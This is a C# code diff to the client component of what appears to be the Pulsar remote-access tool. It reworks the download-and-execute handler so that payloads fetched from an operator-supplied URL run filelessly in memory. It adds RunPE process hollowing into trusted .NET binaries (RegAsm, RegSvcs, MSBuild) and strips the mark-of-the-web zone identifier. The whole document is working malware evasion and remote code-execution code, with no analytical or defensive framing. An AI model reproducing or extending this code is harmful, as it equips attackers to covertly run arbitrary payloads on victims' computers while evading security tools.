@@ -32,7 +32,7 @@ namespace Pulsar.Client.Messages
             _client = client;
             _client.ClientState += OnClientStateChange;
             _webClient = new WebClient { Proxy = null };
-            _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
+            _webClient.DownloadDataCompleted += OnDownloadDataCompleted;
         }
 
         private void OnClientStateChange(Networking.Client s, bool connected)
@@ -99,16 +99,14 @@ namespace Pulsar.Client.Messages
         {
             Debug.WriteLine("Starting process: " + message.FilePath + " | DownloadUrl: " + message.DownloadUrl);
 
-            if (string.IsNullOrEmpty(message.FilePath))
+            if (string.IsNullOrEmpty(message.FilePath) && (message.FileBytes == null || message.FileBytes.Length == 0))
             {
-                // download and then execute
+                // download into memory and then execute
                 if (string.IsNullOrEmpty(message.DownloadUrl))
                 {
                     client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                     return;
                 }
-
-                message.FilePath = FileHelper.GetTempFilePath(".exe");
 
                 try
                 {
@@ -121,47 +119,65 @@ namespace Pulsar.Client.Messages
                         }
                     }
 
-                    _webClient.DownloadFileAsync(new Uri(message.DownloadUrl), message.FilePath, message);
+                    // Download directly to memory instead of temp file
+                    _webClient.DownloadDataAsync(new Uri(message.DownloadUrl), message);
                 }
                 catch
                 {
                     client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                    NativeMethods.DeleteFile(message.FilePath);
                 }
             }
             else
             {
-                // execute locally
-                ExecuteProcess(message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet);
+                // execute from byte array (already in memory) or from file path
+                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath);
             }
         }
 
-        private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
+        private void OnDownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
         {
             var message = (DoProcessStart)e.UserState;
-            if (e.Cancelled)
+            if (e.Cancelled || e.Error != null)
             {
-                NativeMethods.DeleteFile(message.FilePath);
+                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                 return;
             }
 
-            FileHelper.DeleteZoneIdentifier(message.FilePath);
-            ExecuteProcess(message.FilePath, message.IsUpdate);
+            // Execute directly from downloaded bytes (never touches disk)
+            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath);
         }
 
-        private void ExecuteProcess(string filePath, bool isUpdate, bool executeInMemory = false)
+        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory = false, bool useRunPE = false, string runPETarget = null, string runPECustomPath = null)
         {
+            Debug.WriteLine($"ExecuteProcess called: filePath={filePath}, fileBytes={(fileBytes != null ? fileBytes.Length : 0)} bytes, isUpdate={isUpdate}, executeInMemory={executeInMemory}, useRunPE={useRunPE}, runPETarget={runPETarget}");
+            
+            // If we have a file path but no bytes, read the file
+            if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
+            {
+                fileBytes = File.ReadAllBytes(filePath);
+            }
+
+            if (fileBytes == null || fileBytes.Length == 0)
+            {
+                Debug.WriteLine("ExecuteProcess: No file bytes available!");
+                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                return;
+            }
+            
             if (isUpdate)
             {
                 try
                 {
+                    // For updates, we need to write to a temp file temporarily
+                    string tempPath = FileHelper.GetTempFilePath(".exe");
+                    File.WriteAllBytes(tempPath, fileBytes);
+                    
                     var clientUpdater = new ClientUpdater();
-                    clientUpdater.Update(filePath);
+                    clientUpdater.Update(tempPath);
                     _client.Exit();
                 }
                 catch (Exception ex)
                 {
-                    NativeMethods.DeleteFile(filePath);
                     _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                 }
             }
@@ -169,15 +185,50 @@ namespace Pulsar.Client.Messages
             {
                 try
                 {
-                    if (executeInMemory)
+                    if (useRunPE)
                     {
+                        Debug.WriteLine("Executing via RunPE...");
+                        // Execute using RunPE
+                        new Thread(() =>
+                        {
+                            try
+                            {
+                                // Detect payload architecture
+                                bool isPayload64Bit = IsPayload64Bit(fileBytes);
+                                Debug.WriteLine($"Detected payload architecture: {(isPayload64Bit ? "x64" : "x86")}");
+                                
+                                // Adjust host path based on payload architecture
+                                string hostPath = GetRunPEHostPath(runPETarget, runPECustomPath, isPayload64Bit);
+
+                                Debug.WriteLine($"RunPE: hostPath={hostPath}, payload size={fileBytes.Length}");
+
+                                if (string.IsNullOrEmpty(hostPath))
+                                {
+                                    Debug.WriteLine("RunPE: hostPath is null or empty!");
+                                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                                    return;
+                                }
+
+                                bool result = Helper.RunPE.Execute(hostPath, fileBytes);
+                                Debug.WriteLine($"RunPE execution result: {result}");
+                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = result });
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine("RunPE execution failed: " + ex.Message);
+                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                            }
+                        }).Start();
+                    }
+                    else if (executeInMemory)
+                    {
+                        Debug.WriteLine("Executing via .NET Memory Execution...");
                         // Load the assembly into memory and execute it in a separate thread
                         new Thread(() =>
                         {
                             try
                             {
-                                byte[] assemblyBytes = File.ReadAllBytes(filePath);
-                                Assembly asm = Assembly.Load(assemblyBytes);
+                                Assembly asm = Assembly.Load(fileBytes);
                                 MethodInfo entryPoint = asm.EntryPoint;
                                 if (entryPoint != null)
                                 {
@@ -195,19 +246,87 @@ namespace Pulsar.Client.Messages
                     }
                     else
                     {
+                        Debug.WriteLine("Executing via normal process start...");
+                        // For normal execution, we have to write to temp file (Windows requirement)
+                        string tempPath = FileHelper.GetTempFilePath(".exe");
+                        File.WriteAllBytes(tempPath, fileBytes);
+                        FileHelper.DeleteZoneIdentifier(tempPath);
+                        
                         ProcessStartInfo startInfo = new ProcessStartInfo
                         {
                             UseShellExecute = true,
-                            FileName = filePath
+                            FileName = tempPath
                         };
                         Process.Start(startInfo);
                         _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                     }
                 }
-                catch (Exception)
+                catch (Exception ex)
                 {
+                    Debug.WriteLine($"ExecuteProcess exception: {ex.Message}");
                     _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                 }
+            }
+        }
+
+        private string GetRunPEHostPath(string target, string customPath, bool isPayload64Bit)
+        {
+            // Choose the appropriate .NET Framework directory based on payload architecture
+            string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+            string frameworkDir;
+            
+            if (isPayload64Bit)
+            {
+                // Use 64-bit framework for 64-bit payloads
+                frameworkDir = Path.Combine(windowsDir, "Microsoft.NET", "Framework64", "v4.0.30319");
+                Debug.WriteLine($"[GetRunPEHostPath] Using 64-bit framework for x64 payload: {frameworkDir}");
+            }
+            else
+            {
+                // Use 32-bit framework for 32-bit payloads
+                frameworkDir = Path.Combine(windowsDir, "Microsoft.NET", "Framework", "v4.0.30319");
+                Debug.WriteLine($"[GetRunPEHostPath] Using 32-bit framework for x86 payload: {frameworkDir}");
+            }
+            
+            // Fallback to current runtime if target framework doesn't exist
+            if (!Directory.Exists(frameworkDir))
+            {
+                frameworkDir = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory();
+                Debug.WriteLine($"[GetRunPEHostPath] Target framework not found, using current runtime: {frameworkDir}");
+            }
+
+            switch (target)
+            {
+                case "a":
+                    return Path.Combine(frameworkDir, "RegAsm.exe");
+                case "b":
+                    return Path.Combine(frameworkDir, "RegSvcs.exe");
+                case "c":
+                    return Path.Combine(frameworkDir, "MSBuild.exe");
+                case "d":
+                    return customPath;
+                default:
+                    return Path.Combine(frameworkDir, "RegAsm.exe");
+            }
+        }
+
+        private bool IsPayload64Bit(byte[] payload)
+        {
+            try
+            {
+                if (payload.Length < 0x40 || payload[0] != 'M' || payload[1] != 'Z')
+                    return false;
+
+                int peOffset = BitConverter.ToInt32(payload, 0x3C);
+                if (peOffset + 6 > payload.Length)
+                    return false;
+
+                ushort machine = BitConverter.ToUInt16(payload, peOffset + 4);
+                return machine == 0x8664; // IMAGE_FILE_MACHINE_AMD64
+            }
+            catch
+            {
+                return false;
             }
         }
 
@@ -279,7 +398,7 @@ namespace Pulsar.Client.Messages
             if (disposing)
             {
                 _client.ClientState -= OnClientStateChange;
-                _webClient.DownloadFileCompleted -= OnDownloadFileCompleted;
+                _webClient.DownloadDataCompleted -= OnDownloadDataCompleted;
                 _webClient.CancelAsync();
                 _webClient.Dispose();
             }
